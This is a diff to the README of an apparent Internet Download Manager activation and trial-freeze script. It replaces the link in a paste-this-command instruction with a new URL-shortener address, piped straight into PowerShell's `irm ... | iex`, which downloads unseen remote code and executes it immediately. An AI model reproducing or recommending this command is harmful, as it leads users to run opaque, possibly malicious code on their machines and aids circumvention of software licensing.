@@ -19,7 +19,7 @@ After that follow the below steps to activate it.
 * Right-click on the Windows start menu and select PowerShell or Terminal (Not CMD).
 * Copy-paste the below code and press enter
   ```bash
-   irm "https://ln.run/yYzUg" | iex
+   irm "https://url-shortener.me/P0CC" | iex
    ```
   or
   ```bash
@@ -31,9 +31,11 @@ After that follow the below steps to activate it.
 
 
 # Screenshots 📸
-(https://github.com/sritzone/IDM-Activation-Script/images/01.png)
+![Image](https://github.com/sritzone/IDM-Activation-Script/images/01.png)
 
-(https://github.com/sritzone/IDM-Activation-Script/images/02.png)
+![Image](https://github.com/sritzone/IDM-Activation-Script/images/02.png)
+
+![Image](https://github.com/sritzone/IDM-Activation-Script/images/03.png)
 
 # Info ℹ️
 ## Freeze Trial 🥶
